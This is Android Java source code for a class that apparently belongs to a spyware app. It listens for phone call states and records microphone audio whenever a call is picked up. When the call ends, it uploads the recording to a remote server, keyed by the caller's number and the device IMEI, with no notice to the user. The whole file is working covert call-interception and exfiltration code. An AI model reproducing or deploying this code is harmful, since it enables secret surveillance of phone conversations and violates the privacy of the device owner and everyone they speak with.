package com.phone.data;

import com.authority.AuthoritySettings;
import com.main.ForegroundService;
import com.network.Network;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import java.io.File;
import java.io.FileInputStream;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PhoneCallAudio extends PhoneStateListener implements Runnable
{
	private final String TAG = "PhoneCallAudio";
	private String phoneNumber = null;   
	private MediaRecorder mediaRecorder;
	private String audioFilePath;
	private Context context;
	private String mode = "_in_";
	public static PhoneCallAudio gPhoneCallAudio = null;
	
	public PhoneCallAudio(Context context){
		this.context = context;
	}
	

	
	@Override
	public void onCallStateChanged(int state, String incomingNumber)
	{
		super.onCallStateChanged(state, incomingNumber); 
		
		if (this.phoneNumber == null && incomingNumber != null ) {
			this.phoneNumber = incomingNumber.replaceAll(" ", "");
		}
		
		try
		{
			switch(state){
				case TelephonyManager.CALL_STATE_RINGING:		//ring
				{				
					Log.e(TAG,"CALL_STATE_RINGING:" + incomingNumber);
					WriteDateFile.writeLogFile(TAG + " CALL_STATE_RINGING:" + incomingNumber+ "\r\n");
					break;
				}
				case TelephonyManager.CALL_STATE_OFFHOOK: 	//pick up phone call through
				{	
					try {
						String datetime = PublicFunction.formatCurrentDateInFileName();
						audioFilePath = ForegroundService.LOCAL_PATH_NAME + this.phoneNumber + "_" + datetime + 
								 mode + ForegroundService.PHONECALLAUDIO_FILE_NAME + ".amr";
						
						mediaRecorder = new MediaRecorder();
						mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);   
						mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB); 
						mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);   
						mediaRecorder.setOutputFile(audioFilePath);  
						mediaRecorder.prepare();    
						
						mediaRecorder.setPreviewDisplay(null);
						mediaRecorder.setOnInfoListener(null);
						mediaRecorder.setOnErrorListener(null);
						mediaRecorder.start();
						
						Log.e(TAG,"CALL_STATE_OFFHOOK:" + incomingNumber);
						WriteDateFile.writeLogFile(TAG + " CALL_STATE_OFFHOOK:" + incomingNumber + "\r\n");
					} catch (Exception e) {
						e.printStackTrace();
					}

					break;
				}
				case TelephonyManager.CALL_STATE_IDLE:			//hang up phone,stop
				{		
					try {
						if(mediaRecorder != null){
							mediaRecorder.setPreviewDisplay(null);
							mediaRecorder.setOnInfoListener(null);
							mediaRecorder.setOnErrorListener(null);
							Thread.sleep(100);
							//This happens if stop() is called immediately after start()
							mediaRecorder.stop();
							mediaRecorder.reset();
							mediaRecorder.release();
							mediaRecorder = null;
						}
						
						File file = new File(audioFilePath);
						if (phoneNumber != null && audioFilePath.contains(phoneNumber) == false) {
							String datetime = PublicFunction.formatCurrentDateInFileName();
							String newfn = ForegroundService.LOCAL_PATH_NAME + this.phoneNumber + "_" + datetime + 
									mode + ForegroundService.PHONECALLAUDIO_FILE_NAME + "_copy.amr";
							File newfile = new File(newfn);
							boolean ret = file.renameTo(newfile);
							if(ret == false){
								break;
							}

							file.delete();
							file = newfile;
						}
						
						if (file.length() < 1024) {
							break;
						}
						
						if(Network.isNetworkConnected(context) == false 
								/*|| Network.getNetworkType(context) != Network.WIFI_CONNECTION*/){
							break;
						}
						
						FileInputStream fin = new FileInputStream(file);
						int filesize = (int)file.length();
						int filenamelen = file.getName().getBytes().length;
						int sendsize = filesize + 4 + filenamelen +4;
						byte[] sendbuf = new byte[sendsize];
						byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
						System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
						System.arraycopy(file.getName().getBytes(), 0, sendbuf, 4, filenamelen);
						byte[] bytefilesize = PublicFunction.intToBytes(filesize);
						System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);				
						fin.read(sendbuf,4 + filenamelen + 4,filesize);
						fin.close();
						
						SendDataToServer sendaudio = new SendDataToServer(sendbuf, sendsize, 
								Public.CMD_DATA_PHONECALLAUDIO, Public.IMEI);
						Thread thread = new Thread(sendaudio);
						thread.start();
						
						//file.delete();

						Log.e(TAG,"CALL_STATE_IDLE:" + incomingNumber);
						WriteDateFile.writeLogFile(TAG + " CALL_STATE_IDLE:" + incomingNumber + "\r\n");
						
					} catch (Exception e) {
						e.printStackTrace();
					}
					
					audioFilePath = null;
					this.phoneNumber = null;
					break;
				}
			}
		}
		catch (Exception ex)
		{
           ex.printStackTrace();
           String error = ExceptionProcess.getExceptionDetail(ex);
           String stack = ExceptionProcess.getCallStack();
           WriteDateFile.writeLogFile("PhoneCallRecord exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
	}
	
	@Override
	public void run(){
		try {
			if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.RECORD_AUDIO) == false){
				return;
			}
			
			Looper.prepare();
			TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
			if (gPhoneCallAudio == null) {
				gPhoneCallAudio = new PhoneCallAudio(context);
			}
			
			tm.listen(gPhoneCallAudio, PhoneStateListener.LISTEN_CALL_STATE); 

			Looper.loop();
		} catch (Exception e) {
			String error = ExceptionProcess.getExceptionDetail(e);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("PhoneCallAudio exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			e.printStackTrace();
		}
	}
}

